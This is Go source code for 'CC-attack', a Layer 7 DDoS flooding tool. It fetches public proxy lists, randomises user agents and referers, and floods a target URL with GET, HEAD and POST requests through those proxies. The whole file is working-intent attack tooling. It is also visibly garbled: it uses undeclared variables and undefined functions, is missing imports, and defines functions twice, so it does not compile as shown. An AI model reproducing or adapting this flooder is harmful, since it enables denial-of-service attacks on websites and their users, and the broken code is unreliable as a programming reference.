package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?redirect=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.qwant.com/search?q=",
		"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
		"https://www.google.ad/search?q=",
		"https://www.google.ae/search?q=",
		"https://www.google.com.af/search?q=",
		"https://www.google.com.ag/search?q=",
		"https://www.google.com.ai/search?q=",
		"https://www.google.al/search?q=",
		"https://www.google.am/search?q=",
		"https://www.google.co.ao/search?q=",
	}
)

func main() {
	fmt.Println(`
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 3.7.1 (2022/3/24)
                              C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+] Added Http Proxy Support       │
│          [+] Optimization                   │
│          [+] Changed Varible Name           │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘`)
	var (
		mode      = "cc"
		url       = ""
		proxy_ver = "5"
		brute     = false
		out_file  = "proxy.txt"
		threadNum = 800
		data      = ""
		cookies   = ""
	)
	strings := "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
	rand.Seed(time.Now().UnixNano())
	getUserAgent := func() string {
		platform := []string{"Macintosh", "Windows", "X11"}
		browser := []string{"chrome", "firefox", "ie"}
		os := platform[rand.Intn(len(platform))]
		if os == "Macintosh" {
			os = []string{"68K", "PPC", "Intel Mac OS X"}[rand.Intn(3)]
		} else if os == "Windows" {
			os = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}[rand.Intn(15)]
		} else if os == "X11" {
			os = []string{"Linux i686", "Linux x86_64"}[rand.Intn(2)]
		}
		browser := browser[rand.Intn(len(browser))]
		if browser == "chrome" {
			webkit := fmt.Sprintf("%d.0%d.%d", rand.Intn(100)+500, rand.Intn(10000), rand.Intn(1000))
			version := fmt.Sprintf("%d.0%d.%d", rand.Intn(100), rand.Intn(10000), rand.Intn(1000))
			return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
		} else if browser == "firefox" {
			currentYear := time.Now().Year()
			year := rand.Intn(currentYear-2020+1) + 2020
			month := rand.Intn(12) + 1
			day := rand.Intn(30) + 1
			gecko := fmt.Sprintf("%d%s%d", year, fmt.Sprintf("%02d", month), fmt.Sprintf("%02d", day))
			version := fmt.Sprintf("%d.0", rand.Intn(72)+1)
			return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/%s Firefox/%s", os, version, gecko, version)
		} else if browser == "ie" {
			version := fmt.Sprintf("%d.0", rand.Intn(99)+1)
			engine := fmt.Sprintf("%d.0", rand.Intn(99)+1)
			option := []bool{true, false}[rand.Intn(2)]
			token := ""
			if option {
				token = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}[rand.Intn(6)] + "; "
			}
			return fmt.Sprintf("Mozilla/5.0 (compatible; MSIE %s; %s; %sTrident/%s)", version, os, token, engine)
		}
		return ""
	}
	randomURL := func() string {
		return fmt.Sprintf("%d", rand.Intn(271400281257))
	}
	genReqHeader := func(method string) string {
		var header string
		if method == "get" || method == "head" {
			connection := "Connection: Keep-Alive\r\n"
			if cookies != "" {
				connection += fmt.Sprintf("Cookies: %s\r\n", cookies)
			}
			accept := acceptall[rand.Intn(len(acceptall))]
			referer := fmt.Sprintf("Referer: %s%s\r\n", referers[rand.Intn(len(referers))], url)
			useragent := fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
			header = referer + useragent + accept + connection + "\r\n"
		} else if method == "post" {
			postHost := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", url, target)
			content := "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
			refer := fmt.Sprintf("Referer: http://%s%s\r\n", target, path)
			userAgent := fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
			accept := acceptall[rand.Intn(len(acceptall))]
			if data == "" {
				data = string(randomBytes(16))
			}
			length := fmt.Sprintf("Content-Length: %d \r\nConnection: Keep-Alive\r\n", len(data))
			if cookies != "" {
				length += fmt.Sprintf("Cookies: %s\r\n", cookies)
			}
			header = postHost + accept + refer + content + userAgent + length + "\n" + data + "\r\n\r\n"
		}
		return header
	}
	parseURL := func(originalURL string) {
		originalURL = strings.TrimSpace(originalURL)
		var url string
		path = "/"
		port = 80
		protocol = "http"
		if strings.HasPrefix(originalURL, "http://") {
			url = originalURL[7:]
		} else if strings.HasPrefix(originalURL, "https://") {
			url = originalURL[8:]
			protocol = "https"
		} else {
			fmt.Println("> That looks like not a correct url.")
			os.Exit(1)
		}
		tmp := strings.Split(url, "/")
		website := tmp[0]
		check := strings.Split(website, ":")
		if len(check) != 1 {
			port, _ = strconv.Atoi(check[1])
		} else {
			if protocol == "https" {
				port = 443
			}
		}
		target = check[0]
		if len(tmp) > 1 {
			path = url[len(website):]
		}
	}
	inputOption := func(question string, options []string, defaultValue string) string {
		var ans string
		for ans == "" {
			fmt.Print(question)
			fmt.Scanln(&ans)
			ans = strings.TrimSpace(ans)
			if ans == "" {
				ans = defaultValue
			} else {
				found := false
				for _, option := range options {
					if ans == option {
						found = true
						break
					}
				}
				if !found {
					fmt.Println("> Please enter the correct option")
					ans = ""
				}
			}
		}
		return ans
	}
	cc := func(event *sync.WaitGroup, proxyType int) {
		header := genReqHeader("get")
		proxy := strings.Split(proxies[rand.Intn(len(proxies))], ":")
		add := "?"
		if strings.Contains(path, "?") {
			add = "&"
		}
		event.Wait()
		for {
			s, err := socks.DialWithProxy(proxyType, fmt.Sprintf("%s:%s", proxy[0], proxy[1]), target)
			if err != nil {
				continue
			}
			if protocol == "https" {
				config := &tls.Config{
					ServerName: target,
				}
				s = tls.Client(s, config)
			}
			for i := 0; i < 100; i++ {
				getHost := fmt.Sprintf("GET %s%s%s HTTP/1.1\r\nHost: %s\r\n", path, add, randomURL(), target)
				request := getHost + header
				_, err = s.Write([]byte(request))
				if err != nil {
					break
				}
			}
			s.Close()
			proxy = strings.Split(proxies[rand.Intn(len(proxies))], ":")
		}
	}
	head := func(event *sync.WaitGroup, proxyType int) {
		header := genReqHeader("head")
		proxy := strings.Split(proxies[rand.Intn(len(proxies))], ":")
		add := "?"
		if strings.Contains(path, "?") {
			add = "&"
		}
		event.Wait()
		for {
			s, err := socks.DialWithProxy(proxyType, fmt.Sprintf("%s:%s", proxy[0], proxy[1]), target)
			if err != nil {
				continue
			}
			if protocol == "https" {
				config := &tls.Config{
					ServerName: target,
				}
				s = tls.Client(s, config)
			}
			for i := 0; i < 100; i++ {
				headHost := fmt.Sprintf("HEAD %s%s%s HTTP/1.1\r\nHost: %s\r\n", path, add, randomURL(), target)
				request := headHost + header
				_, err = s.Write([]byte(request))
				if err != nil {
					break
				}
			}
			s.Close()
			proxy = strings.Split(proxies[rand.Intn(len(proxies))], ":")
		}
	}
	post := func(event *sync.WaitGroup, proxyType int) {
		request := genReqHeader("post")
		proxy := strings.Split(proxies[rand.Intn(len(proxies))], ":")
		event.Wait()
		for {
			s, err := socks.DialWithProxy(proxyType, fmt.Sprintf("%s:%s", proxy[0], proxy[1]), target)
			if err != nil {
				continue
			}
			if protocol == "https" {
				config := &tls.Config{
					ServerName: target,
				}
				s = tls.Client(s, config)
			}
			_, err = s.Write([]byte(request))
			if err != nil {
				s.Close()
				continue
			}
			s.Close()
			proxy = strings.Split(proxies[rand.Intn(len(proxies))], ":")
		}
	}
	acceptall := []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, deflate;q=0.6, identity;q=0.4\r\n",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\r\n",
	}
	genReqHeader := func(method string) string {
		header := ""
		for _, v := range acceptall {
			header += v
		}
		if method == "get" {
			header += "Connection: Keep-Alive\r\n\r\n"
		} else if method == "head" {
			header += "Connection: Keep-Alive\r\n\r\n"
		} else if method == "post" {
			header += "Content-Type: application/x-www-form-urlencoded\r\n"
			header += "Content-Length: 5235\r\n"
			header += "Connection: Keep-Alive\r\n\r\n"
			header += data
		}
		return header
	}
	randomURL := func() string {
		return fmt.Sprintf("?%d", rand.Intn(1000000000))
	}
	checking := func(lines string, proxyType int, ms int, rlock *sync.RWMutex) {
		proxy := strings.Split(lines, ":")
		if len(proxy) != 2 {
			rlock.Lock()
			proxies = append(proxies[:i], proxies[i+1:]...)
			rlock.Unlock()
			return
		}
		err := 0
		for {
			if err >= 3 {
				rlock.Lock()
				proxies = append(proxies[:i], proxies[i+1:]...)
				rlock.Unlock()
				break
			}
			s, err := socks.DialWithProxy(proxyType, fmt.Sprintf("%s:%s", proxy[0], proxy[1]), "1.1.1.1:80")
			if err != nil {
				err += 1
				continue
			}
			s.SetDeadline(time.Now().Add(time.Duration(ms) * time.Millisecond))
			_, err = s.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
			if err != nil {
				err += 1
				continue
			}
			s.Close()
			break
		}
	}
	checkSocks := func(ms int) {
		threadList := make([]*sync.WaitGroup, 0)
		rlock := &sync.RWMutex{}
		for _, lines := range proxies {
			th := &sync.WaitGroup{}
			th.Add(1)
			threadList = append(threadList, th)
			if proxyVer == "5" {
				go getChecking(th, 5, ms, rlock)
			} else if proxyVer == "4" {
				go getChecking(th, 4, ms, rlock)
			} else if proxyVer == "http" {
				go getChecking(th, 0, ms, rlock)
			}
			fmt.Printf("> Checked %d proxies\r", nums)
		}
		for _, th := range threadList {
			th.Wait()
			fmt.Printf("> Checked %d proxies\r", nums)
		}
		fmt.Printf("\r\n> Checked all proxies, Total Worked:%d\n", len(proxies))
		file, err := os.Create(outFile)
		if err != nil {
			fmt.Println("> Failed to create file")
			return
		}
		defer file.Close()
		for _, lines := range proxies {
			file.WriteString(lines)
		}
		fmt.Printf("> They are saved in %s\n", outFile)
	}
	checkList := func(socksFile string) {
		fmt.Println("> Checking list")
		temp, err := ioutil.ReadFile(socksFile)
		if err != nil {
			fmt.Println("> Failed to read file")
			return
		}
		tempList := make([]string, 0)
		for _, i := range strings.Split(string(temp), "\n") {
			if i != "" && !strings.Contains(i, "#") {
				if strings.Contains(i, ":") {
					ip := strings.Split(i, ":")[0]
					if net.ParseIP(ip) != nil {
						tempList = append(tempList, i)
					}
				}
			}
		}
		file, err := os.Create(socksFile)
		if err != nil {
			fmt.Println("> Failed to create file")
			return
		}
		defer file.Close()
		for _, i := range tempList {
			file.WriteString(i + "\n")
		}
	}
	downloadProxies := func(proxyVer string) {
		if proxyVer == "4" {
			file, err := os.Create(outFile)
			if err != nil {
				fmt.Println("> Failed to create file")
				return
			}
			defer file.Close()
			socks4API := []string{
				"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
				"https://openproxylist.xyz/socks4.txt",
				"https://proxyspace.pro/socks4.txt",
				"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
				"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
				"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
				"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
				"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
				"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
				"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
				"https://www.proxy-list.download/api/v1/get?type=socks4",
				"https://www.proxyscan.io/download?type=socks4",
				"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
				"https://api.openproxylist.xyz/socks4.txt",
			}
			for _, api := range socks4API {
				r, err := http.Get(api)
				if err != nil {
					continue
				}
				defer r.Body.Close()
				body, err := ioutil.ReadAll(r.Body)
				if err != nil {
					continue
				}
				file.Write(body)
			}
			try := []string{
				"https://www.socks-proxy.net/",
			}
			for _, api := range try {
				r, err := http.Get(api)
				if err != nil {
					continue
				}
				defer r.Body.Close()
				body, err := ioutil.ReadAll(r.Body)
				if err != nil {
					continue
				}
				for _, i := range strings.Split(string(body), "\n") {
					if strings.Contains(i, "<td>") {
						ip := strings.Split(i, "<td>")[1]
						port := strings.Split(i, "<td>")[2]
						port = strings.Split(port, "</td>")[0]
						if net.ParseIP(ip) != nil {
							file.WriteString(fmt.Sprintf("%s:%s\n", ip, port))
						}
					}
				}
			}
			fmt.Printf("> Have already downloaded proxies list as %s\n", outFile)
		} else if proxyVer == "5" {
			file, err := os.Create(outFile)
			if err != nil {
				fmt.Println("> Failed to create file")
				return
			}
			defer file.Close()
			socks5API := []string{
				"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
				"https://openproxylist.xyz/socks5.txt",
				"https://proxyspace.pro/socks5.txt",
				"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
				"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
				"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
				"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
				"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
				"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
				"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
				"https://www.proxy-list.download/api/v1/get?type=socks5",
				"https://www.proxyscan.io/download?type=socks5",
				"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
				"https://api.openproxylist.xyz/socks5.txt",
			}
			for _, api := range socks5API {
				r, err := http.Get(api)
				if err != nil {
					continue
				}
				defer r.Body.Close()
				body, err := ioutil.ReadAll(r.Body)
				if err != nil {
					continue
				}
				file.Write(body)
			}
			fmt.Printf("> Have already downloaded proxies list as %s\n", outFile)
		} else if proxyVer == "http" {
			file, err := os.Create(outFile)
			if err != nil {
				fmt.Println("> Failed to create file")
				return
			}
			defer file.Close()
			httpAPI := []string{
				"https://multiproxy.org/txt_all/proxy.txt",
				"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
				"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
				"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
				"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
				"https://openproxylist.xyz/http.txt",
				"https://proxyspace.pro/http.txt",
				"https://proxyspace.pro/https.txt",
				"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
				"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
				"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
				"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
				"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
				"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
				"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
				"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
				"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
				"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
				"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
				"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
				"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
				"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
				"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
				"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
				"https://rootjazz.com/proxies/proxies.txt",
				"https://sheesh.rip/http.txt",
				"https://www.proxy-list.download/api/v1/get?type=https",
			}
			for _, api := range httpAPI {
				r, err := http.Get(api)
				if err != nil {
					continue
				}
				defer r.Body.Close()
				body, err := ioutil.ReadAll(r.Body)
				if err != nil {
					continue
				}
				file.Write(body)
			}
			fmt.Printf("> Have already downloaded proxies list as %s\n", outFile)
		}
	}
	main := func() {
		flag.StringVar(&target, "url", "", "set target url")
		flag.StringVar(&mode, "mode", "cc", "set program mode")
		flag.StringVar(&data, "data", "", "set post data path (only works on post mode)")
		flag.StringVar(&cookies, "cookies", "", "set cookies (Example: 'id:xxx;ua:xxx')")
		flag.StringVar(&proxyVer, "v", "5", "set proxy type (4/5/http, default:5)")
		flag.IntVar(&threadNum, "t", 800, "set threads number (default:800)")
		flag.StringVar(&outFile, "f", "proxy.txt", "set proxies file (default:proxy.txt)")
		flag.BoolVar(&brute, "b", false, "enable/disable brute mode")
		flag.IntVar(&period, "s", 60, "set attack time(default:60)")
		flag.BoolVar(&downloadSocks, "down", false, "download proxies")
		flag.BoolVar(&checkProxies, "check", false, "check proxies")
		flag.Parse()
		if downloadSocks {
			downloadProxies(proxyVer)
		}
		if _, err := os.Stat(outFile); os.IsNotExist(err) {
			fmt.Println("Proxies file not found")
			return
			//panic(err)
		}
		proxies, _ = ioutil.ReadFile(outFile)
		checkList(outFile)
		proxies, _ = ioutil.ReadFile(outFile)
		if len(proxies) == 0 {
			fmt.Println("> There are no more proxies. Please download a new proxies list.")
			return
		}
		fmt.Printf("> Number Of Proxies: %d\n", len(proxies))
		if checkProxies {
			checkSocks(3)
		}
		proxies, _ = ioutil.ReadFile(outFile)
		if target == "" {
			fmt.Println("> There is no target. End of process ")
			return
		}
		event := &sync.WaitGroup{}
		fmt.Println("> Building threads...")
		buildThreads(mode, threadNum, event, proxyVer)
		event.Wait()
		fmt.Println("> Flooding...")
		time.Sleep(time.Duration(period) * time.Second)
	}
}